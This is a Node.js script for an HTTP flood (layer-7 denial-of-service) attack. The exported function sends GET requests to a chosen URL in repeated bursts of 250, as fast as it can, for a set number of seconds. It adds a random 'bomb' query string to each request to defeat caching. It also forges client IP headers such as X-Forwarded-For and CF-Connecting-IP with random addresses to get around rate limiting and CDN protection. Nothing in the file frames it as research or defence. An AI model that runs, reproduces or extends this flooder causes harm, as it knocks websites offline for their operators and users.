const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (X11; Linux x86_64)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X)",
  "curl/7.68.0",
  "Wget/1.21"
];

function fakeIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

function randomHeaders(hostname) {
  const ip = fakeIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Referer": `https://${hostname}/?ref=${Math.random().toString(36).substring(2)}`,
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const options = {
      method: "GET",
      hostname: url.hostname,
      path: url.pathname + url.search + `?bomb=${Math.random().toString(36)}`,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers: randomHeaders(url.hostname)
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] INFINITY to ${url.hostname}`);
      res.on("data", () => {});
    });

    req.on("error", () => {});
    req.end();
  }

  function burst() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 250; i++) send(); // 🔥 Burst of 200
    setImmediate(burst); // 🔁 Fire again immediately
  }

  burst();
};